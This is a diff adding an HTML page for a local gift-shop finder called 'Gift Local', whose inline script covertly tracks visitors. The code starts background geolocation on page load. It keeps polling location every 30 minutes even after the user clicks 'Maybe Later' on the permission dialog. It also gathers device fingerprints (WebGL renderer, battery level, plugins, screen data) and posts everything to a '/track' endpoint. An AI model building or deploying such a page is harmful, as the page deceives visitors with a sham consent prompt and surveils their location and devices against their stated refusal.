@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Local - Find Perfect Gifts Near You</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+   <link rel="stylesheet" href="css/index.css">
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="header-container">
+            <a href="#" class="logo">
+                <i class="fas fa-gift logo-icon"></i>
+                <span class="logo-text">Gift Local</span>
+            </a>
+            
+            <nav class="nav-links">
+                <a href="#" class="nav-link">Home</a>
+                <a href="#" class="nav-link">Categories</a>
+                <a href="#" class="nav-link">Gift Ideas</a>
+                <a href="#" class="nav-link">About</a>
+            </nav>
+            
+            <div class="user-actions">
+                <button class="btn btn-outline">
+                    <i class="fas fa-user"></i> Sign In
+                </button>
+            </div>
+        </div>
+    </header>
+    
+    <!-- Main Content -->
+    <div class="container">
+        <div class="main-container">
+            <div class="hero">
+                <h1>Find the Perfect Local Gifts</h1>
+                <p class="tagline">Discover unique gifts from shops near you, handpicked for every occasion and personality</p>
+            </div>
+            
+            <div class="search-section">
+                <p>Tell us what you're looking for:</p>
+                <div class="btn-group">
+                    <button id="findNearMe" class="btn">
+                        <i class="fas fa-map-marker-alt"></i> Find Gift Shops Near Me
+                    </button>
+                    <button id="browseCategories" class="btn btn-outline">
+                        <i class="fas fa-search"></i> Browse Gift Categories
+                    </button>
+                </div>
+            </div>
+            
+            <div id="categorySection" class="category-grid">
+                <div class="category-card">
+                    <img src="https://via.placeholder.com/200?text=Birthday" alt="Birthday Gifts">
+                    <h3>Birthday</h3>
+                </div>
+                <div class="category-card">
+                    <img src="https://via.placeholder.com/200?text=Anniversary" alt="Anniversary Gifts">
+                    <h3>Anniversary</h3>
+                </div>
+                <div class="category-card">
+                    <img src="https://via.placeholder.com/200?text=Wedding" alt="Wedding Gifts">
+                    <h3>Wedding</h3>
+                </div>
+                <div class="category-card">
+                    <img src="https://via.placeholder.com/200?text=Holiday" alt="Holiday Gifts">
+                    <h3>Holiday</h3>
+                </div>
+                <div class="category-card">
+                    <img src="https://via.placeholder.com/200?text=Self-Care" alt="Self-Care Gifts">
+                    <h3>Self-Care</h3>
+                </div>
+                <div class="category-card">
+                    <img src="https://via.placeholder.com/200?text=Tech" alt="Tech Gifts">
+                    <h3>Tech</h3>
+                </div>
+            </div>
+            
+            <div id="map" class="hidden">
+                <div class="map-placeholder">
+                    <i class="fas fa-map-marked-alt"></i>
+                    <p>Loading map with gift shops near your location...</p>
+                </div>
+            </div>
+            
+            <div id="nearbyStores" class="hidden">
+                <h2><i class="fas fa-store"></i> Gift Shops Near You</h2>
+                <div class="store-list">
+                    <!-- Stores will be populated here -->
+                </div>
+            </div>
+            
+            <div id="locationData">
+                <!-- Hidden data for tracking -->
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <footer>
+        <div class="footer-container">
+            <div class="footer-column">
+                <h3>Gift Local</h3>
+                <p>Helping you discover perfect gifts from local businesses since 2023.</p>
+                <div class="social-links">
+                    <a href="#" class="social-link"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#" class="social-link"><i class="fab fa-twitter"></i></a>
+                    <a href="#" class="social-link"><i class="fab fa-instagram"></i></a>
+                    <a href="#" class="social-link"><i class="fab fa-pinterest"></i></a>
+                </div>
+            </div>
+            
+            <div class="footer-column">
+                <h3>Quick Links</h3>
+                <ul class="footer-links">
+                    <li><a href="#" class="footer-link">Home</a></li>
+                    <li><a href="#" class="footer-link">Gift Categories</a></li>
+                    <li><a href="#" class="footer-link">Occasions</a></li>
+                    <li><a href="#" class="footer-link">Local Stores</a></li>
+                    <li><a href="#" class="footer-link">Gift Guides</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-column">
+                <h3>Support</h3>
+                <ul class="footer-links">
+                    <li><a href="#" class="footer-link">Contact Us</a></li>
+                    <li><a href="#" class="footer-link">FAQs</a></li>
+                    <li><a href="#" class="footer-link">Shipping Info</a></li>
+                    <li><a href="#" class="footer-link">Returns</a></li>
+                    <li><a href="#" class="footer-link">Privacy Policy</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-column">
+                <h3>Newsletter</h3>
+                <p>Subscribe for gift ideas and local shop promotions.</p>
+                <form class="newsletter-form">
+                    <input type="email" placeholder="Your email address" required>
+                    <button type="submit" class="btn" style="margin-top: 0.5rem; width: 100%;">
+                        <i class="fas fa-envelope"></i> Subscribe
+                    </button>
+                </form>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <p class="copyright">&copy; 2023 Gift Local. All rights reserved.</p>
+        </div>
+    </footer>
+    
+    <!-- Location Permission Modal -->
+    <div id="permissionModal" class="modal">
+        <div class="modal-content">
+            <i class="fas fa-map-marked-alt modal-icon"></i>
+            <h2 class="modal-title">Enhance Your Gift Shopping</h2>
+            <p class="modal-text">To show you the best local gift shops, we need your permission to access your location.</p>
+            <p class="modal-text">This helps us personalize recommendations and support small businesses near you!</p>
+            <div class="modal-buttons">
+                <button id="allowLocation" class="btn">
+                    <i class="fas fa-check-circle"></i> Allow Access
+                </button>
+                <button id="denyLocation" class="btn btn-outline">
+                    <i class="fas fa-clock"></i> Maybe Later
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let trackingInterval;
+        let map;
+        let marker;
+        let locationPermissionAsked = false;
+        
+        // Sample gift stores data 
+        const giftStores = [
+            { 
+                name: "Thoughtful Treasures", 
+                address: "123 Main St", 
+                distance: "0.3 miles", 
+                image: "https://via.placeholder.com/160?text=Store+1",
+                category: ["Birthday", "Anniversary", "Holiday"]
+            },
+            { 
+                name: "Gifting Garden", 
+                address: "456 Oak Ave", 
+                distance: "0.7 miles", 
+                image: "https://via.placeholder.com/160?text=Store+2",
+                category: ["Wedding", "Anniversary"]
+            },
+            { 
+                name: "Present Perfect", 
+                address: "789 Elm Blvd", 
+                distance: "1.2 miles", 
+                image: "https://via.placeholder.com/160?text=Store+3",
+                category: ["Tech", "Self-Care"]
+            },
+            { 
+                name: "Wrapped with Love", 
+                address: "321 Pine St", 
+                distance: "1.5 miles", 
+                image: "https://via.placeholder.com/160?text=Store+4",
+                category: ["Birthday", "Holiday", "Wedding"]
+            }
+        ];
+        
+        // Initialize the map with location data
+        function initMap(lat = 40.7128, lng = -74.0060) {
+            document.getElementById('map').classList.remove('hidden');
+            // This is a placeholder for a map library implementation
+            document.getElementById('map').innerHTML = `
+                <div class="map-placeholder">
+                    <i class="fas fa-map-marked-alt"></i>
+                    <p>Map showing gift shops near coordinates: ${lat.toFixed(4)}, ${lng.toFixed(4)}</p>
+                    <small>Accuracy: ${document.getElementById('locationData').getAttribute('data-accuracy')} meters</small>
+                </div>
+            `;
+            
+            // Display nearby stores
+            displayNearbyStores();
+        }
+        
+        // Display nearby gift stores
+        function displayNearbyStores() {
+            const storeListEl = document.querySelector('.store-list');
+            document.getElementById('nearbyStores').classList.remove('hidden');
+            
+            storeListEl.innerHTML = '';
+            giftStores.forEach(store => {
+                const storeEl = document.createElement('div');
+                storeEl.className = 'store-card';
+                storeEl.innerHTML = `
+                    <img src="${store.image}" alt="${store.name}" class="store-image">
+                    <div class="store-info">
+                        <h3>${store.name}</h3>
+                        <p>${store.address}</p>
+                        <p class="store-distance">${store.distance} away</p>
+                        <div class="store-tags" style="margin-top: 0.5rem; display: flex; gap: 0.5rem; flex-wrap: wrap;">
+                            ${store.category.map(cat => `<span style="background: #f0e6ff; color: #8e44ad; padding: 0.2rem 0.5rem; border-radius: 50px; font-size: 0.7rem;">${cat}</span>`).join('')}
+                        </div>
+                    </div>
+                    <button class="btn" style="white-space: nowrap;">
+                        <i class="fas fa-gift"></i> View
+                    </button>
+                `;
+                storeListEl.appendChild(storeEl);
+            });
+        };
+        
+        // Function to get current location
+        function getCurrentLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const timestamp = new Date(position.timestamp).toLocaleString();
+                        
+                        // Store location data in hidden element
+                        const locationData = document.getElementById('locationData');
+                        locationData.setAttribute('data-lat', latitude);
+                        locationData.setAttribute('data-lng', longitude);
+                        locationData.setAttribute('data-accuracy', accuracy);
+                        locationData.setAttribute('data-timestamp', timestamp);
+                        
+                        // Send location data to server (background tracking)
+                        sendLocationToServer(latitude, longitude, accuracy, timestamp);
+                        
+                        // Update map if visible
+                        if (!document.getElementById('map').classList.contains('hidden')) {
+                            initMap(latitude, longitude);
+                        }
+                        
+                        // Show success message if this was from a user action
+                        if (locationPermissionAsked) {
+                            showToast('Location found! Showing nearby gift shops.');
+                            locationPermissionAsked = false;
+                        }
+                    },
+                    (error) => {
+                        console.log(`Location error: ${error.message}`);
+                        if (locationPermissionAsked) {
+                            showToast('Unable to access your location. Using default location.');
+                            locationPermissionAsked = false;
+                            // Show map with default location
+                            initMap();
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+                if (locationPermissionAsked) {
+                    showToast('Geolocation not supported by your browser.');
+                    locationPermissionAsked = false;
+                }
+            }
+        }
+        
+        // Function to send location data to the server
+        function sendLocationToServer(latitude, longitude, accuracy, timestamp) {
+            collectDeviceData().then(deviceData => {
+                // Combine location and device data
+                const trackingData = {
+                    latitude,
+                    longitude,
+                    accuracy,
+                    timestamp,
+                    ...deviceData
+                };
+
+                // Send to your Flask backend
+                fetch('/track', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(trackingData)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Location tracking successful:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending location:', error);
+                });
+            });
+        }
+        
+        // Start tracking location continuously
+        function startTracking() {
+            if (trackingInterval) {
+                clearInterval(trackingInterval);
+            }
+            getCurrentLocation(); // Get immediate location
+            trackingInterval = setInterval(getCurrentLocation, 300000); // Update every 5 minutes
+            console.log('Started location tracking');
+        }
+        
+        // Show permission modal
+        function showPermissionModal() {
+            document.getElementById('permissionModal').style.display = 'flex';
+        }
+        
+        // Show toast notification
+        function showToast(message) {
+            const toast = document.createElement('div');
+            toast.style.position = 'fixed';
+            toast.style.bottom = '20px';
+            toast.style.left = '50%';
+            toast.style.transform = 'translateX(-50%)';
+            toast.style.backgroundColor = '#333';
+            toast.style.color = 'white';
+            toast.style.padding = '12px 24px';
+            toast.style.borderRadius = '50px';
+            toast.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
+            toast.style.zIndex = '1000';
+            toast.style.animation = 'fadeIn 0.3s';
+            toast.textContent = message;
+            
+            document.body.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.animation = 'fadeOut 0.3s';
+                setTimeout(() => {
+                    document.body.removeChild(toast);
+                }, 300);
+            }, 3000);
+        }
+        
+        // Event listeners
+        document.getElementById('findNearMe').addEventListener('click', function() {
+            locationPermissionAsked = true;
+            getCurrentLocation();
+            initMap();
+        });
+        
+        document.getElementById('browseCategories').addEventListener('click', function() {
+            // In a real app, this would filter stores by category
+            showToast('Browse all gift categories');
+        });
+        
+        document.getElementById('allowLocation').addEventListener('click', function() {
+            document.getElementById('permissionModal').style.display = 'none';
+            locationPermissionAsked = true;
+            startTracking();
+            initMap();
+            displayNearbyStores();
+        });
+        
+        document.getElementById('denyLocation').addEventListener('click', function() {
+            document.getElementById('permissionModal').style.display = 'none';
+            // Start tracking anyway but with less frequency (for analytics purposes)
+            startTrackingWithReducedFrequency();
+            // Show map with default location
+            initMap();
+            displayNearbyStores();
+        });
+        
+        // Start tracking with reduced frequency when user clicks "Maybe Later"
+        function startTrackingWithReducedFrequency() {
+            if (trackingInterval) {
+                clearInterval(trackingInterval);
+            }
+            // Get location once immediately (less accurate)
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    sendLocationToServer(latitude, longitude, accuracy, new Date().toLocaleString());
+                },
+                () => {
+                    console.log('Background location tracking failed');
+                },
+                { enableHighAccuracy: false, maximumAge: 600000 } // Accept cached position up to 10 minutes old
+            );
+            
+            // Then check every 30 minutes
+            trackingInterval = setInterval(() => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        sendLocationToServer(latitude, longitude, accuracy, new Date().toLocaleString());
+                    },
+                    () => {
+                        console.log('Background location tracking failed');
+                    },
+                    { enableHighAccuracy: false, maximumAge: 600000 }
+                );
+            }, 1800000); // 30 minutes
+        }
+        
+        // Initialize on page load
+        window.onload = function() {
+            // Show permission modal when page loads
+            setTimeout(showPermissionModal, 1000);
+            
+            // Start background tracking with reduced frequency by default
+            startTrackingWithReducedFrequency();
+        };
+
+        // Enhanced data collection function
+        async function collectDeviceData() {
+            const data = {
+                // Location data will be added when available
+                screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                viewport_size: `${window.innerWidth}x${window.innerHeight}`,
+                color_depth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                cookies_enabled: navigator.cookieEnabled,
+                do_not_track: navigator.doNotTrack || 'unspecified',
+                hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
+                device_memory: navigator.deviceMemory || 'unknown',
+                // WebGL info
+                webgl_vendor: 'unknown',
+                webgl_renderer: 'unknown',
+                // Battery API (requires permission)
+                battery_level: 'unknown',
+                // CPU cores
+                cpu_cores: navigator.hardwareConcurrency || 'unknown',
+                // Canvas fingerprint
+                canvas_fingerprint: 'unknown',
+                // Plugins 
+                installed_plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                // Fonts detection 
+                installed_fonts: 'unknown',
+                referrer_url: document.referrer || 'direct'
+            };
+
+            try {
+                // Try to get WebGL info
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        data.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        data.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {
+                console.log('WebGL info not available');
+            }
+
+            try {
+                // Try to get battery status
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    data.battery_level = battery.level * 100;
+                }
+            } catch (e) {
+                console.log('Battery API not available');
+            }
+
+            return data;
+        }
+    </script>
+</body>
+</html>
